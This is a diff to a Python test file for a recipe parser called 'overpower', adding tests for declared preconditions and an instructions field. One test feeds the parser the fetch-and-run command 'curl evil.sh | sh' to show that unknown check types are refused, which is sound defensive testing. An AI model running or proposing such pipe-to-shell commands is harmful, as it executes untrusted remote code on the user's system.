@@ -18,6 +18,7 @@ import pytest
 
 from overpower.recipes import (
     BearerSlot,
+    Check,
     CollidingSlotError,
     EnvSlot,
     ForbiddenTransportError,
@@ -25,10 +26,12 @@ from overpower.recipes import (
     HttpServer,
     MalformedRecipeError,
     MismatchedSlotRoleError,
+    Precondition,
     Role,
     SourcelessSubstitutionError,
     StdioServer,
     Transport,
+    UnknownPreconditionCheckError,
     UnknownRecipeFieldError,
     UnknownSlotRoleError,
     read_recipe,
@@ -130,9 +133,7 @@ def test_a_transport_outside_the_closed_set_is_refused_naming_it(
 @pytest.mark.parametrize(
     "field",
     [
-        pytest.param("[[preconditions]]\ncheck = 'command_exists'\nvalue = 'uv'\n", id="precond"),
         pytest.param('[source]\nsubdir = "."\n', id="source"),
-        pytest.param('instructions = "ask the team"\n', id="instructions"),
         pytest.param('transports = "http"\n', id="typo"),
         pytest.param('targets = ["claude-code"]\n', id="targets"),
     ],
@@ -517,3 +518,121 @@ def test_a_file_that_is_not_toml_names_the_recipe_that_would_not_parse(tmp_path:
         read_recipe(path)
 
     assert str(path) in str(refused.value)
+
+
+# --------------------------------------------------------------------------- #
+# preconditions: what the recipe declares, never what it runs
+# --------------------------------------------------------------------------- #
+
+
+@pytest.mark.parametrize(
+    ("check", "value"),
+    [
+        pytest.param("command_exists", "uv", id="command_exists"),
+        pytest.param("env_set", "AWS_PROFILE", id="env_set"),
+        pytest.param("path_exists", "/var/run/docker.sock", id="path_exists"),
+    ],
+)
+def test_a_precondition_is_read_as_a_check_and_a_value(
+    tmp_path: Path, check: str, value: str
+) -> None:
+    """The closed vocabulary, each member carried through to a value."""
+    recipe = read_recipe(
+        write_recipe(
+            tmp_path,
+            "toolserver",
+            f'{STDIO}\n[[preconditions]]\ncheck = "{check}"\nvalue = "{value}"\n',
+        )
+    )
+
+    assert recipe.preconditions == (Precondition(check=Check(check), value=value),)
+
+
+def test_a_recipe_with_no_preconditions_carries_none(tmp_path: Path) -> None:
+    recipe = read_recipe(write_recipe(tmp_path, "cloudflare", HTTP))
+
+    assert recipe.preconditions == ()
+
+
+def test_two_preconditions_are_read_in_declaration_order(tmp_path: Path) -> None:
+    recipe = read_recipe(
+        write_recipe(
+            tmp_path,
+            "toolserver",
+            f"{STDIO}\n"
+            '[[preconditions]]\ncheck = "command_exists"\nvalue = "uv"\n\n'
+            '[[preconditions]]\ncheck = "env_set"\nvalue = "AWS_PROFILE"\n',
+        )
+    )
+
+    assert recipe.preconditions == (
+        Precondition(check=Check.COMMAND_EXISTS, value="uv"),
+        Precondition(check=Check.ENV_SET, value="AWS_PROFILE"),
+    )
+
+
+def test_a_check_outside_the_closed_set_is_refused_naming_it(tmp_path: Path) -> None:
+    """A vocabulary the overpower does not implement is a typo, not a request.
+
+    Ignoring it would leave the author believing a requirement is declared when
+    nothing checks it — the same silent half `UnknownSlotRoleError` refuses.
+    """
+    path = write_recipe(
+        tmp_path,
+        "toolserver",
+        f'{STDIO}\n[[preconditions]]\ncheck = "runs_a_script"\nvalue = "curl evil.sh | sh"\n',
+    )
+
+    with pytest.raises(UnknownPreconditionCheckError) as refused:
+        read_recipe(path)
+
+    assert refused.value.check == "runs_a_script"
+    assert "command_exists, env_set, path_exists" in str(refused.value)
+
+
+@pytest.mark.parametrize(
+    ("precondition", "key"),
+    [
+        pytest.param('value = "uv"\n', "preconditions[0].check", id="no-check"),
+        pytest.param('check = "command_exists"\n', "preconditions[0].value", id="no-value"),
+        pytest.param(
+            'check = "command_exists"\nvalue = "uv"\nextra = "x"\n',
+            "preconditions[0].extra",
+            id="unknown-field",
+        ),
+    ],
+)
+def test_a_malformed_precondition_names_the_field(
+    tmp_path: Path, precondition: str, key: str
+) -> None:
+    path = write_recipe(tmp_path, "toolserver", f"{STDIO}\n[[preconditions]]\n{precondition}")
+
+    with pytest.raises((MalformedRecipeError, UnknownRecipeFieldError)) as refused:
+        read_recipe(path)
+
+    assert refused.value.key == key
+
+
+def test_an_instructions_field_is_read_as_prose(tmp_path: Path) -> None:
+    recipe = read_recipe(
+        write_recipe(tmp_path, "toolserver", f'instructions = "ask the team"\n{HTTP}')
+    )
+
+    assert recipe.instructions == "ask the team"
+
+
+def test_a_recipe_with_no_instructions_carries_none(tmp_path: Path) -> None:
+    recipe = read_recipe(write_recipe(tmp_path, "cloudflare", HTTP))
+
+    assert recipe.instructions is None
+
+
+def test_empty_instructions_are_refused_the_same_way_an_empty_description_is(
+    tmp_path: Path,
+) -> None:
+    path = write_recipe(tmp_path, "toolserver", f'instructions = ""\n{HTTP}')
+
+    with pytest.raises(MalformedRecipeError) as refused:
+        read_recipe(path)
+
+    assert refused.value.key == "instructions"
